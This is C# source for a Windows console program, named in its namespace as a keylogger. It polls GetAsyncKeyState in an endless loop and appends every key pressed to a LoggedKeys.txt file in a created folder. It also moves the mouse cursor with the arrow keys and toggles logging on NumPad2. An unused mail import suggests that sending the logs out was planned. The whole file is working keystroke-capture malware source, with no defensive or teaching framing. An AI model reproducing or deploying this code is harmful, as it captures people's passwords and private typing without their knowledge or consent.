using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using System.Threading;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.Net.Mail;
using System.Data;
using System.Drawing;


namespace newapplicationKeylogger
{
    class Program
    {
        private static int i;

        [DllImport("User32.dll")]

        public static extern int GetAsyncKeyState(Int32 i);

        public static bool bLogging = true;





        static void Main(string[] args)
        {
            LogKeys();


        }


        private void Form1_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.Control && e.Shift && e.KeyCode == Keys.P)
            {
                if (bLogging)
                {
                    bLogging = false;
                }
                else
                {
                    bLogging = true;
                }

            }
        }


        static void LogKeys()
        {
            String filepath = Path.GetDirectoryName(Path.GetDirectoryName(System.IO.Directory.GetCurrentDirectory()));
            filepath = filepath + @"\LogsFolder\";

            if (!Directory.Exists(filepath))
            {
                Directory.CreateDirectory(filepath);
            }

            string path = (@filepath + "LoggedKeys.txt");

            if (!File.Exists(path))
            {
                using (StreamWriter sw = File.CreateText(path))
                {

                }
                //end
            }

            KeysConverter converter = new KeysConverter();
            string text = "";

            while (5 > 1)
            {

                Thread.Sleep(5);
                for (Int32 i = 0; i < 2000; i++)
                {
                    int key = GetAsyncKeyState(i);



                    if (key == 1 || key == -32767)
                    {
                            text = converter.ConvertToString(i);
                            using (StreamWriter sw = File.AppendText(path))
                            {
                                if (bLogging)
                                    sw.WriteLine(text);

                                //Mouse move with arrows
                                if (text == "Up")
                                {
                                    Cursor.Position = new Point(Cursor.Position.X, Cursor.Position.Y - 10);
                                }
                                if (text == "Down")
                                {
                                    Cursor.Position = new Point(Cursor.Position.X, Cursor.Position.Y + 10);
                                }
                                if (text == "Left")
                                {
                                    Cursor.Position = new Point(Cursor.Position.X - 10, Cursor.Position.Y);
                                }
                                if (text == "Right")
                                {
                                    Cursor.Position = new Point(Cursor.Position.X + 10, Cursor.Position.Y);
                                }


                                if (text == "NumPad2")
                                {
                                    if (bLogging)
                                    {
                                        bLogging = false;
                                    }
                                    else
                                    {
                                        bLogging = true;
                                    }

                                }
                            }
                            break;
                       
                    }

                }

            }

        }

    }
}
    

